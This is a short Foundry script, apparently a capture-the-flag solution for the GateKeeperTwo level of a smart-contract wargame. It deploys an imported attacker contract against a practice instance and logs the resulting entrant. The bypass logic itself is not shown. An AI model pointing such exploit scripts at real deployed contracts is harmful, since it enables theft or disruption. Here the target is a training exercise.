// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {GateSkipperTwo} from "../src/14_GateKeeperTwo.sol";

interface IGateKeeperTwo {
    function entrant() external view returns (address);
}

contract PoC is Script {
    address private immutable gateTwo =
        0x9a8a9bAFCFaDe41A74808af3c3a7280615817Cf2; // Replace with your GateKeeperTwo instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        new GateSkipperTwo(gateTwo);
        console2.log("Entrant: ", IGateKeeperTwo(gateTwo).entrant());

        vm.stopBroadcast();
    }
}
